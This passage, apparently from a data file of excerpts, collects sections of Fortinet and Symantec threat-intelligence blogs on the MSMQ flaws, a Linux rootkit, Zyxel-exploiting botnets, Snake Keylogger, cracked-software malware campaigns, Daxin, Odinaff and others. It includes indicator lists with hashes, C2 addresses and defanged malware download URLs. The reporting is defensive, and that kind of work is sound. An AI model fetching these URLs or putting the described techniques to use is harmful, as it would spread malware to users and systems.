\nW64/RCShell.A!tr\nThe FortiGuard AntiVirus service is supported by FortiGate, FortiMail, FortiClient, and FortiEDR. The Fortinet AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\nFortiEDR detects the malicious event and is detected by the \"Unmapped Executable\" rule within the \"Exfiltration Prevention\" security policy.\nThe FortiGuard Web Filtering Service detects the C2 URLs cited in this report as Malicious and blocks them.\nDue to the ease of disruption, damage to daily operations, potential impact to an organization's reputation, and the unwanted destruction or release of PII, etc., it is important to keep all AV and IPS signatures up to date.\nWe also suggest that organizations have their end users undergo our free NSE training:NSE 1 \u2013 Information Security Awareness. It includes a module on internet threats designed to help end users learn how to identify and protect themselves from various types of phishing attacks.\nIf you believe these or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team.", "source": "Fortinet"}, {"title": "ioc", "content": "154[.]82[.]85[.]12154[.]92[.]19[.]81\n1ded5a6c54a7b10365c41bc850ce41f18d86435fbe9315c37bd767ecdf2551357b98622db7a62ace626dcc8af5bb7ac3726a968241c94612c5b9cb906175f5f3fb73e089d0a276617b9a213080f84d0e411592c7db5548790e3fe1c53295f5a3a676c7490086a4112f920936e57ee49e213aaffd12bb38bc433a073ddfae0f241235419877ccc1f1820cc75e773fe79f9ad0296dd8eea9aa44f511a7b6348cfd02aed2b21a90c82d2ca597340aabfa1d6c52302b08aa9f58e87893f6997c268102c8f22e9d2df7e051fffc49c7d2d240787fbe8395b4c3c96be40b5a111a03ce0a971e606e839e7d5e72dcea0a8a3d081c951250ce25b0ddaf2429bad87ebe3d12ae203fa199291754649a4e592fb0880339c88b07f1d69798114afca06b806114bf52de60e60a526141ffe61ef5afc2a3bc7d60d4086e644ec80e67513d268417ff585fadcf40e25ad9d09cf007d20f6691ccf31d93a5d48d25f7e811cb0ca422bfdc52a65905088b8b897a630c66c16ec5c2eba992c1c0722e5c8da9afa18124a871b7b837b217d271747337381fbbcff61edfe44e087c55921564b170a8c947d7ce4ce72ca7e0cebab472e2165a1ebbd9395a60d7478990fd4dbec2eb195f583001d3d4dc0a72c92cf27a390e95e1fad6229d18ab255b625985939eb4b90f7172dff66af9c34958a3b095210664c26a934b5f734b64ea3170f1507a12050372542f81546656de73e009b541ed12cbcc9feced4f6ab79f9e9a0ee9df148b6a76b1c8b026ac9e72ffe8ac1dd8d18abfbb4eb9c23bccb42ab9af2580ed72b7ad8378960ee2bfc32930e19f762f561f4a6448160de2bde6ce330309326d745f898790506401a3bac69f6669a3dd832650e4752ff68dd6f0cef35b43e6ad59d7df8a6b352c45e48e3564e259ade4f544d01900e8c3f9a74e52ae3bc62f74ddf0138b7d3de2c77c59663ec5d8969b688530a3c9228b72807bc17a9822d558c42ee8a47423b59d75e228198450f7a9a2e051eeca6388028a6deb8e9843951bf21575aae7f34bdc0aa362bb42eb5e4cff69b60d67f7f155a3e2b9b905c90a1cc2aac4ad753becec205160b78de45c11ed42f3da707c9cee0688fa4190233a9b4f1379ad9bd41e73eff193caab25960b6a990641ea8d412b5ba456b64ad165b7216c48b50ad87cd7ce19ae30cb709ea3ceb7107b129c64ec9c314157fc6a8df079262bc486ca7291799a7474196c7cf60158421a2d81697e24e693e76cd1da06b9bf1cce8224de916a5eb0c76c9ba7acc3833f8cdc7f7d31a72dfbe69d2be1f8b7cc48d208b80a6608c72c3c590f86d93b074533c0c4ef8a46b6d36ed52cc2b4c179d5d63792ee67c6f1702188695387c64991029dabd702d48eac3ea3f0eef280d4a1ebd3a506c226e98dcedc1b882a11addd25ded8ee5110249b5b1a391e4d77d327", "source": "Fortinet"}, {"title": "Introduction", "content": "Over the last few months, FortiGuard Labs has discovered and reported multiple vulnerabilities found in the Microsoft Message Queuing (MSMQ) service. Microsoft patched these vulnerabilities in the April and July 2023 security updates. These patches are rated as critical/important, and as always, we urge users to install them as soon as possible.\nAffected platforms:WindowsImpacted parties:Microsoft Windows users with Microsoft Message Queuing service installedImpact:Remote code execution and denial-of-serviceSeverity level:Critical and Important\nIn this post, we will walk through the attack surfaces of MSMQ, the approaches we took to tackle the challenges we encountered during fuzzing, and finally, we will provide details of the vulnerabilities.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Fortinet customers can use FortiDAST to identify any network assets that may be vulnerable to the MSMQ vulnerabilities discussed previously. FortiGuard Labs has also released IPS signatures to protect our customers from the vulnerabilities mentioned in this post. Again, we can't emphasize enough the urgency to apply the latest Microsoft patches to prevent you or your organization from falling victim to a devastating cyberattack.", "source": "Fortinet"}, {"title": "Introduction", "content": "This is a follow-up analysis to a previous blog about azero day exploitwhere the FortiGuard Incident Response (FGIR) team examined how remote attackers exploited multiple vulnerabilities in an appliance to gain control of a customer's system.\nAt the end of that blog, we revealed that the remote attacker had deployed a rootkit (a loadable kernel module, sysinitd.ko) and a user-space binary file (sysinitd) on the affected system by executing a shell script (Install.sh). Additionally, to establish rootkit persistence, entries for the rootkit malware were added in the /etc/rc.local and /etc/rc.d/rc.local files so the rootkit malware is loaded during system startup.", "source": "Fortinet"}, {"title": "Summary", "content": "In this analysis, we focused on the rootkit malware.  We first explained how the kernel module set a Netfilter hook function on NF_INET_PRE_ROUTING to hijack the incoming TCP traffic to the compromised system.\nNext, we elaborated on what related tasks the Netfilter hook function performs, including how it handles the attacker-init packet and the response packet format, invokes the user-space file, and exchanges data between the user-space process and the kernel module.\nYou also learned how the user-space process is started, how it disguises itself as \"bash,\" how it creates the child process using a fork() system call, and how it is eventually replaced by \"/bin/sh\" to process the attacker's Linux commands to control the system.\nFinally, we demonstrated how an attacker establishes a connection to a compromised system, sends Linux commands, and retrieves the result through traffic sniffing.", "source": "Fortinet"}, {"title": "ioc", "content": "[install.sh]8D016D02F8FBE25DCE76481A90DD0B48630CE9E74E8C31BA007CF133E48B8526\n[sysinitd.ko]6EDD7B3123DE985846A805931CA8EE5F6F7ED7B160144AA0E066967BC7C0423A\n[sysinitd]D57A2CAC394A778E19CE9B926F2E0A71936510798F30D20F207F2A49B49CE7B1\nReference:Burning Zero Days: Suspected Nation-State Adversary Targets Ivanti CSA", "source": "Fortinet"}, {"title": "Introduction", "content": "In our1H 2023 Threat Landscape Report, we examine the cyberthreat landscape over the year's first half to identify trends and share insights with security professionals, enabling them to enhance their security strategies and better prioritize patching efforts. The report findings reflect the collective intelligence of FortiGuard Labs, drawn from Fortinet's vast array of sensors that collect billions of threat events observed worldwide during this same period. Below are key takeaways from the report.", "source": "Fortinet"}, {"title": "Summary", "content": "In the year's first half, we observed significant activity amongadvanced persistent threat (APT)groups, a rise in ransomware frequency and complexity, increased botnet activity, and much more. And while attack volume isn't entirely on the continual upward climb we've seen in the past, we're witnessing breach attempts become more sophisticated and targeted.\nAs cybercriminals continue to advance their tactics, the good news for security practitioners is that much of the malicious activity observed is familiar, giving leaders and their teams ample opportunities to implement effective defense strategies.", "source": "Fortinet"}, {"title": "Protect", "content": "Threat actors won't be slowing down anytime soon, particularly as organized cybercrime groups make it even easier for them to achieve a quick payday. However, there are numerous actions organizations can take today to better protect their networks from these adversaries.\nSharing and utilizing threat intelligence has never been more important to combat the ever-increasing sophistication and volume of cyberthreats. Additionally, understanding attack flows-from initial entry points to post-exploitation activities-is vital to creating effective cybersecurity strategies. Finally, there's no better time to implement new security technologies and reassess your team's processes and playbooks. Developing and maintaining a comprehensive defense strategy is crucial to protecting enterprise networks today and in the future.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical\nIn June 2023, FortiGuard Labs detected the propagation of several DDoS botnets exploiting the Zyxel vulnerability (CVE-2023-28771). This vulnerability is characterized by a command injection flaw affecting multiple firewall models that could potentially allow an unauthorized attacker to execute arbitrary code by sending a specifically crafted packet to the targeted device. The severity of this flaw, rated 9.8 on the CVSS scoring system, was reported by researchers fromTRAPA Security. Zyxel released asecurity advisoryregarding this vulnerability on April 25, 2023. Subsequently, the Cybersecurity and Infrastructure Security Agency (CISA) added this security flaw to itsKnown Exploited Vulnerabilities(KEV) catalog in May. Through the capture of exploit traffic, the attacker's IP address was identified, and it was determined that the attacks were occurring in multiple regions, including Central America, North America, East Asia, and South Asia.\nSince the publication of theexploit module,there has been a sustained surge in malicious activity. Analysis conducted by FortiGuard Labs has identified a significant increase in attack bursts starting from May, as depicted in the trigger count graph shown in Figure 1. We also identified multiple botnets, including Dark.IoT, a variant based on Mirai, as well as another botnet that employs customized DDoS attack methods. In this article, we will provide a detailed explanation of the payload delivered through CVE-2023-28771 and associated botnets.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Targeting vulnerable devices has always been a primary objective for threat actors, and the prevalence of remote code execution attacks poses a major concern for IoT devices and Linux servers. The presence of exposed vulnerabilities in devices can lead to significant risks. Once an attacker gains control over a vulnerable device, they can incorporate it into their botnet, enabling them to execute additional attacks, such as DDoS. To effectively address this threat, it is crucial to prioritize the application of patches and updates whenever possible. Taking proactive measures to ensure the security of these devices is highly recommended.", "source": "Fortinet"}, {"title": "ioc", "content": "d618c817e6a93193a499126156a1f7e888008dacdb247a769fd69ce4c0c87b67a6729c047d776294fa21956157eec0b50efa7447b8e2834b05be31080767006f729f2fa4d037912a360cb7c4e2c37765da0c38725451600f0258109b672f615e2c55674e938e7618f7c9273e3da61ce7aeab3dc5626b7b8b4e3fc7cc95d0436f928d8ccd71edda5891068d703603ba0b70687f746c9da73afa6692b274ea757c6137a30d8eb932d25664ced747424b15072e676b5d4d27d5b8f3b84f483442170c394849ce4f636cc79cc84389b66a0dbdaf14a61a6d87302e807f2153bc6c2b2fe13ee992cf00778bcc92dc3732305114dca1700dedca7c29342216df236644034cdcb42d1d7b921b4732230bbdcb4089107490a30b8cd7a62e67b657e33d263d69c780fefa0c3a34190989d43268a272004f0623d3e596bc0c92e1744832c979f69993110688372a5898d05f1141b7f44f3f5f55cd50b6a493c1d33af141c8c68211116bbc43c2fe0aba8b598b88b218adc0d995311a4e7030de8acd48076e51becb81d6bdfe79111974c05f2e4a20a8825a872a92df86cbc98517100b031a42b4e116c5d2d3e9d4777c7eaa3c3835a126c02673583c2dfb1ae2bf0bf0db4885d3d93910bfb8410a0e82810d05aa67a6702ce0cdfc38d1d01f2f9471d2015012c65cfd227d393fd338223eb50140571760de04ef0a21fe3c4636e1bfaf4966f82f5ec551f9ac3bb5a3b1ace5dd21c35239bd983fd9a36e0e7c07bfb48a3fdd28fa9225db6d42084123989712313489e255376134f8e77f07b77c345a026304312022da42ab6df882c44d984f9aceea7f08e217a5ca8ca985c533a1af399cee", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from the victim's computerSeverity level:High\nFortinet's FortiGuard Labs recently caught a phishing campaign in the wild with a malicious Excel document attached to the phishing email. We performed a deep analysis on the campaign and discovered that it delivers a new variant of Snake Keylogger.\nSnake Keylogger (aka \"404 Keylogger\" or \"KrakenKeylogger\") is a subscription-based keylogger with many capabilities. It is a .NET-based software originally sold on a hacker forum.\nOnce executed on a victim's computer, it has the ability to steal sensitive data, including saved credentials from web browsers and other popular software, the system clipboard, and basic device information. It can also log keystrokes and capture screenshots.\nIn the following sections, we will look at the phishing spam, how it lures the recipient into opening a malicious Excel document, how the Excel document downloads and executes a new variant of Snake Keylogger, and what anti-analysis techniques it uses to protect itself from being detected and blocked during the attack.", "source": "Fortinet"}, {"title": "Summary", "content": "Figure 19 illustrates the entire workflow of the Snake Keylogger campaign.\nThis analysis reviewed the entire process of this Snake Keylogger campaign, which is being led by a phishing email.\nThe phishing email, which included a malicious Excel document, lured the recipient into opening the file to see the details of a \"balance payment.\" The Excel document was displayed in different tools, and I explained how it downloads an HTA file by exploiting a known vulnerability.\nIt then leverages multiple language scripts, such as JavaScript, VBScript, and PowerShell, to download the Snake Keylogger's Loader module.\nAfterward, I elaborated on how the Loader module extracts multiple modules (including several middle modules and the Deploy module) from the file's Resource section. Malware often uses a process like this to prevent being detected and analyzed.\nNext, I introduced how the Snake Keylogger Deploy module establishes persistence on the victim's computer and conducts process hollowing to put the core module into a newly created process to run.\nFinally, we examined how the Snake Keylogger steals sensitive information from the victim's computer and how the stolen data is sent to the attacker using the SMTP protocol.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:WindowsImpacted Users:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrency and perform cryptojacking on systemsSeverity Level:Critical\nFortiGuard Labs came across an ongoing threat campaign targeting YouTube viewers searching for pirated software earlier this month. Videos advertising downloads of \"cracked\" (aka pirated) software are uploaded by verified YouTube channels with a large number of subscribers. Victims are led to execute malicious binaries that install multiple malware into their systems focused on harvesting credentials, cryptojacking, and stealing cryptocurrency funds from wallets.\nWhile investigating this campaign,other researcherspublished a report about it. And although there are overlaps with our findings, this report provides additional observations, such as the deployment of a third malware family being distributed to the victims.\nThis article describes the entire attack chain and technical details on the malware components that make up this campaign.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This campaign highlights the dangers of downloading illegally pirated copies of software because of the tendency of threat actors to prey on such users to steal credentials, sensitive data, or even cryptocurrency. On top of this, the infected machine is also used for cryptojacking to mine Monero for the threat actor.\nThe agility of these threat actors is also a cause for concern, as we observed the threat actor behind this campaign rapidly uploading new copies of similar malware whenever GitHub takes down the malicious repositories.\nFortiGuard Labs will continue to monitor and report on updates to this threat campaign.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\n820bbfc1f5023af60a7048a0c25e3db51b481afd6986bf1b5ff806cf604c1f4c\ne256b5ef66c4e56dac32934594b41e7e8cf432f834046e1c24c0827b120e6ddb\n62d4caf908b3645281d5f3c0f5b5dc3a4beb410015196f7eaf66ca743f415668\n44810cead810cd546a8983e464157a4eb98ebbd518c4f4249e6b99e7f911090f\nf91d9de259052595946250a1440a2457dbda9ee8aec8add24419ff939f13e003\n2fcb61da34b259b9b130c0c75525697931b9dff8e7f9b2198f9db21b5193eeba\nd2e371810e8c7b1e039a02a578b1af0c6250665e85206b97a1ecb71aa5568443\n21bc43587dc1f19ec6271e69fe709b18fdefdfbfc5971a3edf00e92cb1b77995\na0ac98bbd611fc697133ab872f9d978dc1931ea70f8a2374d18aff5754f7c110\nba9503b78bc62d4e5e22e4f8e04b28bb6179e146e1c0a6ba14dd06608facb481\n9c5aff1352619f14feb736916374bbed06ef41a7d0cb72d789cb86e8f3906212\n5630c8f0dcd2393daf8477e6e4e419b0d0faf6780b6f1e00ad7a09fd37ddcdd3\nDownload URLs\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/2O23-F1LES-S0ft.rar\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vadwax.exe\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/GUI_MODERNISTA.exe\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/exep.exe\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vaxa.exe\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdsc.exe\nhxxps://github[.]com/jesus061031r/mooliik/releases/download/mooliik/vdscs.exe\nhxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/xmrig.exe\nhxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/WatchNew.exe\nhxxps://github[.]com/dwadaxwad/dvsv/releases/download/sdv/lolMiner.exe\nhxxps://github[.]com/bonniebosidaw/bolikgs/releases/download/voollik/2O23-F1LES-S0ft.rar\nhxxps://pastebin[.]com/raw/5p5KkdBw\nC2s\n79.137.206[.]228 (Vidar C2)\n85.192.40[.]252 (Laplas Clipper C2)\nMonero Wallet Address\n48GSRPwCNzLCkNGCMgUsqfg8BxJq8azyUbMLQM4Dvqh64M8goBjQ2SkVFUokVDzQpqfotv1oDcB8X8qMxuLK6GDBSWU3tp4", "source": "Fortinet"}, {"title": "Introduction", "content": "The operation was carefully planned, with accounts often registered months before they were used \u2013 and well in advance of the 2016 U.S. presidential election. The average time between account creation and first tweet was 177 days.\nA core group of main accounts was used to push out new content. These were often \"fake news\" outlets masquerading as regional news outlets or pretended to be political organizations.\nA much larger pool of auxiliary accounts was used to amplify messages pushed out by the main accounts. These usually pretended to be individuals.\nThe campaign directed propaganda at both sides of the liberal/conservative political divide in the U.S., in particular the more disaffected elements of both camps.\nMost accounts were primarily automated, but they would frequently show signs of manual intervention, such as posting original content or slightly changing the wording of reposted contented, presumably in an attempt to make them appear more authentic and reduce the risk of their deletion. Fake news accounts were set up to monitor blog activity and automatically push new blog posts to Twitter. Auxiliary accounts were configured to retweet content pushed out by the main accounts.\nThe most retweeted account garnered over 6 million retweets. Only a small fraction (1,850) of those retweets came from other accounts within the dataset, meaning many of the retweets could have come from genuine Twitter users.\nOne of the main talking points of the 2016 U.S. presidential election campaign involved attempts to surreptitiously influence public opinion using social media campaigns. In the months after the election, it quickly became apparent that a sophisticated propaganda operation had been directed against American voters.\nNot surprisingly, news of these campaigns caused widespread public concern, prompting social media firms to launch investigations into whether their services had been misused. In October 2018, Twitterreleased a massive datasetof content posted on its service by the Internet Research Agency (IRA), a Russian company responsible for the largest propaganda campaign directed against the U.S.\nThe datasetconsisted of 3,836 Twitter accounts and nearly 10 million tweets. These accounts had amassed almost 6.4 million followers and were following 3.2 million accounts. The sheer volume of data was enormous, more than 275 GB.\nThe archive has proven to be a treasure trove of information on how the IRA's propaganda campaign operated.  For example, prior to the release, many people assumed that its posts were focused on just one side of the political spectrum. Once the data was made public, it quickly became obvious that in order to achieve its goal, the campaign directed propaganda at both sides of the liberal/conservative political divide in the U.S., in particular the more disaffected elements of both camps. The main objective of the campaign instead appeared to be sowing discord by attempting to inflame opinions on both sides. This was not just confined to the online sphere. Several of the accounts were used to organize political rallies in the U.S. and some of the most influential accounts in the dataset were used to promote these events to the largest possible audience.\nHowever, believing that there is a lot to learn from this data beyond its messages and target audience, we decided to carry out some in-depth analysis of the archive to learn more about how this propaganda campaign worked. What we discovered was that this was not an ad-hoc response to political events in the U.S. Instead, the evidence points to a carefully planned and coordinated operation, with the groundwork often laid months in advance.\nWhile the tactics employed changed somewhat over time, the basic template for this operation remained the same, utilizing a small core of accounts to push out new content and a wider pool of automated accounts to amplify those messages.\nAlong the way, we also came across some interesting bits of information, such as what appeared to be some rogue operators using monetized link-shortening services to make some money on the side.", "source": "Symentec"}, {"title": "Introduction", "content": "The Iran-linked espionage group Seedworm (aka MuddyWater) has been highly active in recent months, attacking a wide range of targets, including a large number of government organizations in the Middle East.\nMany of the organizations attacked by Seedworm in recent months have also been targeted by a recently discovered tool called PowGoop (Downloader.Covic), suggesting that it is a tool that Seedworm has incorporated into its arsenal. However, at present Symantec, a division of Broadcom (NASDAQ: AVGO), can only make a medium-confidence link between Seedworm and PowGoop.\nThe recent wave of Seedworm attacks were uncovered by Symantec's Targeted Attack Cloud Analytics, which leverages advanced machine learning to spot patterns of activity associated with targeted attacks. The activity was reviewed by Symantec's Threat Hunter team (part ofSymantec's Endpoint Security Completeoffering) which linked it to previous Seedworm activity.\nAmong the things flagged by Cloud Analytics was a registry key called \"SecurityHealthCore\". The code residing in this registry key is executed by PowerShell from a scheduled task. In all of the organizations where this registry key was found, a known Seedworm backdoor (Backdoor.Mori) was subsequently detected.\nAttacks were uncovered against targets in Iraq, Turkey, Kuwait, the United Arab Emirates, and Georgia. In addition to some government entities, organizations in the telecoms and computer services sector were also targeted.\nIn one such victim, a sample of Backdoor.Mori was dropped and installed as early as December 2019 on a SQL server. Seedworm activity continued until at least July 2020, with the installation of additional hacking tools by the attackers.\nDuring this time, Symantec observed Seedworm performing credential-stealing activities as well as setting up tunnels to its own infrastructure to assist with lateral movement using an open-source tools known asSecure Sockets Funneling(SSF) andChisel. Seedworm is known to have leveraged Chisel in the past.", "source": "Symentec"}, {"title": "Introduction", "content": "UPDATE, April 1, 2022:Updated with additional protection information\nA zero-day vulnerability in the Spring Core Java framework that could allow for unauthenticated remote code execution (RCE) on vulnerable applications was publicly disclosed on March 30, before a patch was released. It was dubbed Spring4Shell.", "source": "Symentec"}, {"title": "Introduction", "content": "Three Romanian men have been indicted in the US for allegedly operating a longstanding fraud operation known as Bayrob that conned victims out of millions of dollars. Bogdan Nicolescu (aka \"Masterfraud\", aka \"mf\"); Danet Tiberiu (aka \"Amightysa\", aka \"amy\"); and Radu Miclaus (aka \"Minolta\", aka \"min\") were arrested by police in Romania earlier this year before being extradited to the US, where they now face multiple charges relating to fraud, identity theft, money laundering, and trafficking in counterfeit goods or services.\nOur research shows that the Bayrob gang are career cybercriminals, earning a living from online fraud. They specialize in detailed scams and go to great lengths to craft convincing emails and create fake websites, voice messages, and even customer support chatrooms in order to dupe victims.\nThe gang began its career running elaborate cons where it created fake vehicle auctions to defraud victims out of tens of thousands of dollars. It later expanded and diversified with a number of different fraud and malware operations, ranging from credit card theft to cryptocurrency mining using infected computers.\nThe FBI believes that the Bayrob group has stolen at least US$4 million from victims over the past eight years, though the actual total may be up to $35 million. It also established that the group infected between 60,000 and 160,000 computers and sent out 11 million malicious emails.\nThe arrests are the culmination of an eight-year law enforcement investigation which was assisted by Symantec. During this time, Symantec discovered multiple versions of Bayrob malware, collected helpful intelligence data, and witnessed Bayrob as it morphed from online fraud to a 300,000+ botnet for cryptocurrency mining.\nSymantec succeeded in exposing the gang's operations, gaining insight into its key players, tactics, malware, and the potential impact and criminal activity undertaken.", "source": "Symentec"}, {"title": "Introduction", "content": "New research by the Symantec Threat Hunter team, part of Broadcom Software, has uncovered a highly sophisticated piece of malware being used by China-linked threat actors, exhibiting technical complexity previously unseen by such actors.  The malware appears to be used in a long-running espionage campaign against select governments and other critical infrastructure targets.\nThere is strong evidence to suggest the malware, Backdoor.Daxin, which allows the attacker to perform various communications and data-gathering operations on the infected computer, has been used as recently as November 2021 by attackers linked to China. Most of the targets appear to be organizations and governments of strategic interest to China. In addition, other tools associated with Chinese espionage actors were found on some of the same computers where Daxin was deployed.\nDaxin is without doubt the most advanced piece of malware Symantec researchers have seen used by a China-linked actor. Considering its capabilities and the nature of its deployed attacks, Daxin appears to be optimized for use against hardened targets, allowing the attackers to burrow deep into a target's network and exfiltrate data without raising suspicions.\nThrough Broadcom's membership in the Joint Cyber Defense Collaborative (JCDC), Symantec researchersworked with the Cyber Security and Infrastructure Security Agency (CISA) to engage with multiple foreign governments targeted with Daxinand assisted in detection and remediation.\nThis is the first in a series of blogs. This blog provides an overview of Daxin's capabilities and will be followed with additional blogs providing further in-depth analysis.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "Malware related to Daxin activity:\n81c7bb39100d358f8286da5e9aa838606c98dfcc263e9a82ed91cd438cb130d1 Backdoor.Daxin (32-bit core)\n06a0ec9a316eb89cb041b1907918e3ad3b03842ec65f004f6fa74d57955573a4 Backdoor.Daxin (64-bit core)\n0f82947b2429063734c46c34fb03b4fa31050e49c27af15283d335ea22fe0555 Backdoor.Daxin (64-bit core)\n3e7724cb963ad5872af9cfb93d01abf7cd9b07f47773360ad0501592848992f4 Backdoor.Daxin (64-bit core)\n447c3c5ac9679be0a85b3df46ec5ee924f4fbd8d53093125fd21de0bff1d2aad Backdoor.Daxin (64-bit core)\n49c827cf48efb122a9d6fd87b426482b7496ccd4a2dbca31ebbf6b2b80c98530 Backdoor.Daxin (64-bit core)\n5bc3994612624da168750455b363f2964e1861dba4f1c305df01b970ac02a7ae Backdoor.Daxin (64-bit core)\n5c1585b1a1c956c7755429544f3596515dfdf928373620c51b0606a520c6245a Backdoor.Daxin (64-bit core)\n6908ebf52eb19c6719a0b508d1e2128f198d10441551cbfb9f4031d382f5229f Backdoor.Daxin (64-bit core)\n7867ba973234b99875a9f5138a074798b8d5c65290e365e09981cceb06385c54 Backdoor.Daxin (64-bit core)\n7a08d1417ca056da3a656f0b7c9cf6cd863f9b1005996d083a0fc38d292b52e9 Backdoor.Daxin (64-bit core)\n8d9a2363b757d3f127b9c6ed8f7b8b018e652369bc070aa3500b3a978feaa6ce Backdoor.Daxin (64-bit core)\nb0eb4d999e4e0e7c2e33ff081e847c87b49940eb24a9e0794c6aa9516832c427 Backdoor.Daxin (64-bit core)\nb9dad0131c51e2645e761b74a71ebad2bf175645fa9f42a4ab0e6921b83306e3 Backdoor.Daxin (64-bit core)\ncf00e7cc04af3f7c95f2b35a6f3432bef990238e1fa6f312faf64a50d495630a Backdoor.Daxin (64-bit core)\ne7af7bcb86bd6bab1835f610671c3921441965a839673ac34444cf0ce7b2164e Backdoor.Daxin (64-bit core)\nea3d773438c04274545d26cc19a33f9f1dbbff2a518e4302addc1279f9950cef Backdoor.Daxin (64-bit core)\n08dc602721c17d58a4bc0c74f64a7920086f776965e7866f68d1676eb5e7951f Backdoor.Daxin (dropper)\n53d23faf8da5791578c2f5e236e79969289a7bba04eee2db25f9791b33209631 Backdoor.Daxin (dropper)\n7a7e8df7173387aec593e4fe2b45520ea3156c5f810d2bb1b2784efd1c922376 Backdoor.Zala (32-bit core)\n8dafe5f3d0527b66f6857559e3c81872699003e0f2ffda9202a1b5e29db2002e Backdoor.Zala (32-bit core)\n96bf3ee7c6673b69c6aa173bb44e21fa636b1c2c73f4356a7599c121284a51cc Backdoor.Trojan (32-bit core)\n9c2f3e9811f7d0c7463eaa1ee6f39c23f902f3797b80891590b43bbe0fdf0e51 Backdoor.Trojan (32-bit core)\nc0d88db11d0f529754d290ed5f4c34b4dba8c4f2e5c4148866daabeab0d25f9c Backdoor.Trojan (32-bit core)\ne6a7b0bc01a627a7d0ffb07faddb3a4dd96b6f5208ac26107bdaeb3ab1ec8217 Backdoor.Trojan (32-bit core)\nFile names attributed to Daxin activity:\n\"ipfltdrvs.sys\"\n\"ndislan.sys\"\n\"ndislan_win2008_x64.sys\"\n\"ntbios.sys\"\n\"patrol.sys\"\n\"performanceaudit.sys\"\n\"print64.sys\"\n\"printsrv64.sys\"\n\"prv64.sys\"\n\"sqlwriter.sys\"\n\"srt.sys\"\n\"srt64.sys\"\n\"syswant.sys\"\n\"usbmrti.sys\"\n\"vncwantd.sys\"\n\"wantd.sys\"\n\"win2k8.sys\"\n\"wmipd.sys\"\n\"[CSIDL_SYSTEM]\\drivers\\pagefile.sys\"\n\"[CSIDL_SYSTEM]\\spool\\drivers\\ntds.sys\"\nMalware observed during overlapping activities:\n705be833bd1880924c99ec9cf1bd0fcf9714ae0cec7fd184db051d49824cbbf4 suspected Backdoor.Daxin\nc791c007c8c97196c657ac8ba25651e7be607565ae0946742a533af697a61878 suspected Backdoor.Daxin\n514d389ce87481fe1fc6549a090acf0da013b897e282ff2ef26f783bd5355a01 Trojan.Emulov (core)\n1a5c23a7736b60c14dc50bf9e802db3fcd5b6c93682bc40141d6794ae96138d3 Trojan.Emulov (dropper)\na0ac5f7d41e9801b531f8ca333c31021c5e064f13699dbd72f3dfd429f19bb26 Trojan.Owprox (core)\naa7047a3017190c66568814eb70483bf74c1163fb4ec1c515c1de29df18e26d7 Trojan.Owprox (dropper)", "source": "Symentec"}, {"title": "Introduction", "content": "The Greenbug espionage group is actively targeting telecommunications companies in South Asia, with activity seen as recently as April 2020.\nThere are indications that at least one of the companies was first targeted as early as April 2019.\nEmail appears to be the initial infection vector used by the group. Greenbug is using a mixture of off-the-shelf tools and living-off-the-land techniques in these attacks. It appears the group is interested in gaining access to database servers; we see it stealing credentials then testing connectivity to these servers using the stolen credentials.\nGreenbug is believed to likely be based out of Iran, and there has been speculation in the past that it has connections to the destructive Shamoon group, which has carried out disk-wiping attacks against organizations in Saudi Arabia. The Shamoon attacks have been extensively covered, but it wasnever clear how the attackers stole the credentials that allowed them to introduce their destructive malware onto victim systems. Research by Symantec, a division of Broadcom (NASDAQ: AVGO), in 2017 found evidence that Greenbug was on an organization's network prior to a wiping attack that involved W32.Disttrack.B (Shamoon's malware). This link was never definitively established, but cooperation between the two groups is considered a possibility.\nMuch of the activity we saw in this attack campaign is in line with activity we have seen from Greenbug in the past, including the use of email as an initial infection vector, the use of publicly available hack tools like Mimikatz and Plink, and the apparent focus on collecting credentials and maintaining a persistent, low-profile presence on victim networks.", "source": "Symentec"}, {"title": "Introduction", "content": "Since January 2016, discreet campaigns involving malware called Trojan.Odinaff have targeted a number of financial organizations worldwide. These attacks appear to be extremely focused on organizations operating in the banking, securities, trading, and payroll sectors. Organizations who provide support services to these industries are also of interest.\nOdinaff is typically deployed in the first stage of an attack, to gain a foothold onto the network, providing a persistent presence and the ability to install additional tools onto the target network. These additional tools bear the hallmarks of a sophisticated attacker which has plagued the financial industry since at least 2013\u2013Carbanak. This new wave of attacks has also used some infrastructure that has previously been used in Carbanak campaigns.\nThese attacks require a large amount of hands on involvement, with methodical deployment of a range of lightweight back doors and purpose built tools onto computers of specific interest. There appears to be a heavy investment in the coordination, development, deployment, and operation of these tools during the attacks. Custom malware tools, purpose built for stealthy communications (Backdoor.Batel), network discovery, credential stealing, and monitoring of employee activity are deployed.\nAlthough difficult to perform, these kinds of attacks on banks can be highly lucrative. Estimates of total losses to Carbanak-linked attacks range from tens of millions to hundreds of millions of dollars.", "source": "Symentec"}, {"title": "Indicators of Compromise", "content": "The following are examples of the various tools in use:\nOdinaff droppers\nf7e4135a3d22c2c25e41f83bb9e4ccd12e9f8a0f11b7db21400152cd81e89bf5\nc122b285fbd2db543e23bc34bf956b9ff49e7519623817b94b2809c7f4d31d14\nOdinaff document droppers\n102158d75be5a8ef169bc91fefba5eb782d6fa2186bd6007019f7a61ed6ac990\n60ae0362b3f264981971672e7b48b2dda2ff61b5fde67ca354ec59dbf2f8efaa\nOdinaff 